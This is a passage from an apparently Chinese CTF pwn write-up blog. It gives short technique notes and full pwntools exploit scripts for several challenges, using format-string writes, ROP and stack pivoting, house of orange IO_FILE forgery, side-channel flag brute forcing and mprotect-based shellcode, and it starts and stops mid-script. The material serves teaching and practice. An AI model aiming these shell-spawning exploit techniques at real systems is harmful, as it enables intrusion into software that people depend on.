canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
shell=leak_addr+0xebdb3


#fmt 1
payload=fmtstr_payload(10,{ret_addr+0x8:p64(pop_rdi)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 2
payload=fmtstr_payload(10,{ret_addr+0x10:p64(str_sh)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 3
payload=fmtstr_payload(10,{ret_addr+0x18:p64(sys_addr)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 4
payload=fmtstr_payload(10,{ret_addr:p64(ret)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()

exit()

io.interactive()
# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
# rsp &amp;amp; 0xf == 0
# rcx == NULL
# rbp == NULL || (u16)[rbp] == NULL
# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [rdx] == NULL || rdx == NULL
# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
# address rbp-0x78 is writable
# [rsi] == NULL || rsi == NULL
# [rdx] == NULL || rdx == NULL
# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [r12] == NULL || r12 == NULL
# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x50 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame_2023_lenlim-shellcode-ora&#34;&gt;0xGame_2023_lenlim-shellcode-ora&lt;/h3&gt;
&lt;p&gt;侧信道爆破flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
# elf=ELF(&amp;quot;./pwn&amp;quot;)


read_shellcode=asm(&#39;&#39;&#39;
    mov edi,0
    push 0x2023000d
    pop rsi
    syscall              
&#39;&#39;&#39;)


def exp(dis,char):
    shellcode = asm(&#39;&#39;&#39;
            push   0x67616c66
            push   0x2
            pop    rax
            mov    rdi,rsp
            xor    rsi,rsi
            syscall 

            mov    rdi,rax
            xor    rax,rax
            mov    rsi,0x20230300
            push   0x50
            pop    rdx
            syscall 
            
            mov dl, byte ptr [rsi+{}]
            mov cl, {}
            cmp cl,dl
            jz loop
            mov al,60
            syscall
            loop:
            jmp loop
            &#39;&#39;&#39;.format(dis,char))
    io.send(shellcode)
flag = &amp;quot;0xGame{N0_SHELLCODE_NEXT_TIME_PLZ&amp;quot;

for i in range(len(flag),50):
    sleep(1)
    log.success(&amp;quot;flag : {}&amp;quot;.format(flag))
    for j in range(0x20,0x80):
        # io = process(&#39;./pwn&#39;)
        io=remote(&amp;quot;8.130.35.16&amp;quot;,54000)
        try:
            payload=read_shellcode
            io.sendafter(b&amp;quot;code:\n&amp;quot;,payload)
            io.recvuntil(b&amp;quot;machanism...\n&amp;quot;)
            exp(i,j)
            io.recvline(timeout=1)
            flag += chr(j)
            io.send(&#39;\n&#39;)
            log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
            io.close()
            break
        except:           
            io.close()


# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar2023_week5_no_output&#34;&gt;newstar2023_week5_no_output:&lt;/h3&gt;
&lt;p&gt;淀粉极客linkmap弱化版，linkmap那道得自己找gadget，这道题直接把libc地址写bss段上了，直接&lt;code&gt;partial write&lt;/code&gt;改write，提前布置好寄存器顺带栈迁移过去泄露就可以了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27515)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401253
pop_rsi_r15=0x401251
pop_rbp=0x40112d
a_addr=0x404050
bss_addr=0x404800
read_text=0x4011c1
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
leave_ret=0x4011ea


# gdb.attach(io)
# pause()

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr+8)*2+p64(read_plt)
io.send(payload)

sleep(0.5)

payload=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr+0x400)*2+p64(read_plt)+p64(pop_rbp)+p64(bss_addr+0x400-0x8)+p64(leave_ret)
io.send(payload)

sleep(0.5)

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr)*2+p64(read_plt)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+p64(pop_rdi)+p64(1)+p64(pop_rbp)+p64(0x404050-0x8)+p64(leave_ret)
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\x60\x30&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.send(payload)



io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011ea : leave ; ret
# 0x000000000040124c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401250 : pop r14 ; pop r15 ; ret
# 0x0000000000401252 : pop r15 ; ret
# 0x000000000040124b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040112d : pop rbp ; ret
# 0x0000000000401253 : pop rdi ; ret
# 0x0000000000401251 : pop rsi ; pop r15 ; ret
# 0x000000000040124d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar_week5_planet&#34;&gt;newstar_week5_planet:&lt;/h3&gt;
&lt;p&gt;这道题有可以任意命令执行的后门函数，但是我们需要绕过验证才能进入&lt;br&gt;
这里我们直接把验证里面生成随机字符串所引用的那一串ascii字符表全部覆盖为1即可&lt;br&gt;
本来week5还有一道pin码侧信道的，就是今年国赛lojin的弱化版，网上一搜就有脚本的，那个8位这个只有6位，但是网络环境挺抽象的，难绷，不放了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25518)
elf=ELF(&amp;quot;./pwn&amp;quot;)

def Jump():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Jump&amp;quot;)
    
def GetName():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GetName&amp;quot;)
    
def Rename(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Rename&amp;quot;)
    io.sendlineafter(b&amp;quot;name\n&amp;quot;,cc)
    
def GoBack(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GoBack&amp;quot;)
    io.sendline(cc)
    
def Check():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Check&amp;quot;)
    
def Search():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Search&amp;quot;)
    
def Nap():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Nap&amp;quot;)
    
def Admin(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Admin&amp;quot;)
    io.sendlineafter(b&amp;quot;passwd\n&amp;gt; &amp;quot;,cc)
    

psss=b&amp;quot;secret_passwd_anti_bad_guys&amp;quot;


# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Passwd: &amp;quot;,psss)

Nap()
# for i in range(11):
#     Nap()
#     Jump()

GetName()
Rename(b&amp;quot;a&amp;quot;*0x10)
GetName()

io.recvuntil(b&amp;quot;a&amp;quot;*0x10)
abcd_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x10
print(&amp;quot;abcd_addr: &amp;quot;,hex(abcd_addr))    


sleep(1)
GetName()
Rename(b&amp;quot;b&amp;quot;*0x18+p64(abcd_addr))
Jump()
GetName()
Rename(b&amp;quot;1&amp;quot;*0x21)

Admin(b&amp;quot;1&amp;quot;*0x1e)


io.sendlineafter(b&amp;quot;exec\n&amp;gt; &amp;quot;,b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_ezheap&#34;&gt;axb_ezheap:&lt;/h3&gt;
&lt;p&gt;当时直接跳过house of orange去看house of apple...&lt;br&gt;
此题GLIBC 2.23 11.03，house of orange的模板题&lt;br&gt;
题目最开始给出堆地址&lt;br&gt;
通过1次add之后的堆溢出写修改&lt;code&gt;top chunk&lt;/code&gt;，需要注意内存页对齐，&lt;code&gt;prev_inuse=1&lt;/code&gt;&lt;br&gt;
再add一次大的申请出修改过后的&lt;code&gt;old top chunk&lt;/code&gt;进入&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
再通过add申请到&lt;code&gt;unsorted bin&lt;/code&gt;以此泄露libc&lt;br&gt;
之后伪造&lt;code&gt;IO_FILE&lt;/code&gt;结构体，2.23可以对&lt;code&gt;vtable&lt;/code&gt;无检查，&lt;code&gt;vtable&lt;/code&gt;伪造到可控堆地址即可&lt;br&gt;
然后保证&lt;code&gt;伪造到的地址+0x18&lt;/code&gt;处也可控，即&lt;code&gt;vtable[3]&lt;/code&gt;可控，此处是&lt;code&gt;__overflow&lt;/code&gt;，修改为&lt;code&gt;system&lt;/code&gt;地址&lt;br&gt;
修改&lt;code&gt;unsorted bin&lt;/code&gt; bk为&lt;code&gt;_IO_list_all-0x10&lt;/code&gt;,后面&lt;code&gt;unsorted bin attack&lt;/code&gt;后再分配一个堆块，利用&lt;code&gt;_chain&lt;/code&gt;标志位，此标志位正好位于&lt;code&gt;_IO_FILE&lt;/code&gt;结构体0x60处，指向下一个文件流，溢出写&lt;code&gt;unsorted bin&lt;/code&gt; size为&lt;code&gt;0x61&lt;/code&gt;， 属于 &lt;code&gt;smallbin&lt;/code&gt;，这个大小的 &lt;code&gt;smallbin&lt;/code&gt; 相对 &lt;code&gt;unsorted bin&lt;/code&gt; 的偏移，与 &lt;code&gt;_chain&lt;/code&gt; 相对 &lt;code&gt;_IO_list_all&lt;/code&gt; 的偏移是一样的,使得&lt;code&gt;_IO_list_all&lt;/code&gt;指向&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
而修改后的&lt;code&gt;unsorted bin&lt;/code&gt;再次malloc时会报错，路径如下&lt;br&gt;
&lt;code&gt;malloc-&amp;gt;_int_malloc-&amp;gt;__libc_message-&amp;gt;abort-&amp;gt;_IO_flush_all_lockp&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_flush_all_lockp&lt;/code&gt;遍历文件流，报错处理 &lt;code&gt;_chain&lt;/code&gt; 指向的下一个文件流，所以利用&lt;code&gt;unsorted bin&lt;/code&gt;伪造&lt;code&gt;IO_FILE&lt;/code&gt;结构体&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28437)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;Name?\n&amp;quot;,cc)

def edit(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)

def show():
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;3&amp;quot;)
    
# gdb.attach(io.pid)
# pause()

heap_addr=int(io.recvline(),16)-0x10
print(&amp;quot;heap_addr:&amp;quot;,hex(heap_addr))

add(0x68,b&amp;quot;a&amp;quot;)
edit(0x6f,b&amp;quot;\x00&amp;quot;*0x68+b&amp;quot;\x71\x0f\x00&amp;quot;)

add(0xf70,b&amp;quot;a&amp;quot;)

add(0x80,b&amp;quot;a&amp;quot;*8)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c5188
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
fake_vtable=heap_addr+0x268


add(0x68,b&amp;quot;asd&amp;quot;)

padding=b&amp;quot;a&amp;quot;*0x60

fakefile=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0x61) #_flags -&amp;gt; /bin/sh
fakefile+=p64(0)+p64(_IO_list_all-0x10) #bk-&amp;gt; _IO_list_all-0x10
fakefile+=p64(0)+p64(1)
fakefile=fakefile.ljust(0xc0,b&amp;quot;\x00&amp;quot;)
fakefile+=p64(0)*3
fakefile+=p64(fake_vtable)+p64(0)*2+p64(sys_addr) # fake_vtable+0x18 (vtable[3]) -&amp;gt; &amp;amp;sys_addr

padding+=fakefile

edit(len(padding),padding)

io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)

gdb.attach(io.pid)
pause()

io.sendlineafter(&amp;quot;it\n&amp;quot;,b&amp;quot;1&amp;quot;) #local

# io.sendlineafter(&amp;quot;it\n&amp;quot;,str(0x100)) #remote

# io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;yukkurisay&#34;&gt;YukkuriSay&lt;/h3&gt;
&lt;p&gt;循环内输入泄露栈地址和libc&lt;br&gt;
最后一次循环内布置跳板&lt;br&gt;
循环外有一次格式化字符串的机会，可以利用刚才我们布置的跳板修改&lt;code&gt;printf&lt;/code&gt;的got表为&lt;code&gt;sys_addr&lt;/code&gt;以及修改&lt;code&gt;ret_addr&lt;/code&gt;再一次输入&lt;code&gt;/bin/sh\x00&lt;/code&gt;来&lt;code&gt;getshell&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28513)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=elf.libc


io.sendafter(b&amp;quot;say?\n&amp;quot;,cyclic(0x98))

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x23b6a 
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92
ret=leak_addr+0x142c92
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xe3b01

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
io.send(b&amp;quot;b&amp;quot;*0xff+b&amp;quot;.&amp;quot;)

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
ret_addr=stack_addr-0x8
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
payload=p64(elf.got[b&amp;quot;printf&amp;quot;])
payload+=p64(ret_addr)
payload+=p64(ret_addr+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+2)

io.send(payload)

s1=sys_addr&amp;amp;0xff
s2=(sys_addr&amp;gt;&amp;gt;8)&amp;amp;0xff
s3=(sys_addr&amp;gt;&amp;gt;16)&amp;amp;0xff
gift1=0x401678&amp;amp;0xff
gift2=(0x401678&amp;gt;&amp;gt;8)&amp;amp;0xff

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;n&amp;quot;)

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(s1,8) #布置跳板在栈上偏移为8
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift1-s1,9) #防止被减数小于减数的情况发生
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift2-gift1,10)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s2-gift2,11)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s3-s2,12)
io.sendafter(b&amp;quot;: \n&amp;quot;,payload)

sleep(1)

io.send(b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;西湖论剑_babycalc&#34;&gt;西湖论剑_babycalc:&lt;/h3&gt;
&lt;p&gt;没有溢出&lt;br&gt;
z3解方程，将解出的值放入对应位置即可&lt;br&gt;
首先存在rbp存在一个&lt;code&gt;off_by_one&lt;/code&gt;，可以改写rbp低1字节，使得rbp可以指向我们可控栈区(概率)&lt;/p&gt;
&lt;p&gt;其次存在一个&lt;code&gt;var_38[idx]=iVar1&lt;/code&gt;，&lt;code&gt;idx&lt;/code&gt;为我们可控字段，即循环的&lt;code&gt;i&lt;/code&gt;值，&lt;code&gt;iVar1&lt;/code&gt;也可控,我们最开始输入的16进制值通过&lt;code&gt;strtol&lt;/code&gt;转化为&lt;code&gt;iVar1&lt;/code&gt;&lt;br&gt;
可以写一字节使ret低一字节为&lt;code&gt;0x18&lt;/code&gt;使得其变为&lt;code&gt;leave; ret&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在可控栈区我们可以放入大量&lt;code&gt;ret&lt;/code&gt;充当&lt;code&gt;sled&lt;/code&gt;，然后放入rop链，最后就可以栈迁移到我们的可控栈区执行rop链&lt;/p&gt;
&lt;p&gt;第一次我们泄露libc，第二次就可以getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28769)
# io=process(&amp;quot;./babycalc&amp;quot;)
elf=ELF(&amp;quot;./babycalc&amp;quot;)
libc=elf.libc

bss_addr=0x6024E0
pop_rdi=0x400ca3
ret=0x4005b9
start=0x400650

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.sym[&#39;puts&#39;])+p64(start)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)
#   payload 0x100-&amp;gt; rbp low 1 byte -&amp;gt; \x00 -&amp;gt; point to stack
#   var_38[0x39] -&amp;gt; rbp+0x1 -&amp;gt; change nop to leave

io.sendafter(b&amp;quot;:&amp;quot;,payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


################


# gdb.attach(io)
# pause()

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
payload1=payload1.ljust(0xd0,b&amp;quot;a&amp;quot;)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
payload=payload1+payload2

payload=payload.ljust(0xfc,b&amp;quot;a&amp;quot;)+p32(0x38)

io.sendafter(b&amp;quot;:&amp;quot;,payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400c9c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400ca0 : pop r14 ; pop r15 ; ret
# 0x0000000000400ca2 : pop r15 ; ret
# 0x0000000000400c9b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400c9f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x0000000000400ca3 : pop rdi ; ret
# 0x0000000000400ca1 : pop rsi ; pop r15 ; ret
# 0x0000000000400c9d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;pcb2023_silent&#34;&gt;pcb2023_silent&lt;/h3&gt;
&lt;p&gt;Full Relro，只给了个read，人太蠢了找不到magic gadget，只有暴力&lt;br&gt;
这里我劫持栈上的残留的一块libc中地址，找的gadget在libc偏移为&lt;code&gt;0x110130&lt;/code&gt;&lt;br&gt;
大概率事件是爆3位,&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;/&lt;/mi&gt;&lt;mn&gt;4096&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;1/16^3=1/4096&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;9&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;
返回的是&lt;code&gt;write+64&lt;/code&gt;，溢出空间足够控制寄存器的值，可以leak出read的libc地址&lt;br&gt;
然后返回&lt;code&gt;_start&lt;/code&gt;，然后往bss段上写orw shellcode&lt;br&gt;
返回&lt;code&gt;_start&lt;/code&gt;，mprotect赋予bss段rwx权限后再次返回&lt;code&gt;_start&lt;/code&gt;，溢出跳转执行shellcode即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

ggg=asm(shellcraft.open(&#39;./flag&#39;))+asm(shellcraft.read(3,0x601d00,0x100))+asm(shellcraft.write(1,0x601d00,0x100))

def pwn():

    ret=0x400696
    pop_rdi=0x400963
    pop_rsi_r15=0x400961
    main=0x400879
    pop_rbp=0x400788
    bss_addr=0x601800
    pop_rsp_r13_r14_r15=0x40095d
    read_plt=elf.plt[b&amp;quot;read&amp;quot;]


    # for i in range(2):
    #     payload=cyclic(0x48)+p64(main)
    #     io.send(payload)


    # payload=p64(elf.got[b&amp;quot;read&amp;quot;])*0x10
    # io.send(payload)

    # gdb.attach(io)
    # pause()

    payload=p64(bss_addr)*9+p64(ret)*0xb+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+b&amp;quot;\x30\xf1\x8d&amp;quot;
